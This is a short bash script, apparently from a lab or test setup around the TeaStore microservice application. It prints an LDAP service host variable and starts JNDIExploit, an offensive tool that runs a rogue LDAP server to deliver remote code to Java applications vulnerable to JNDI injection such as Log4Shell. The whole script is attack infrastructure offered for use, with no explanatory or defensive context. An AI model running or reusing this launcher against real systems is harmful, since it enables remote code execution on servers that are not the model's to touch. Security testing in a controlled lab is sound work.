#!/usr/bin/env bash

echo ${TEASTORE_LDAP_SERVICE_HOST}
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i "${TEASTORE_LDAP_SERVICE_HOST}" -p "8888"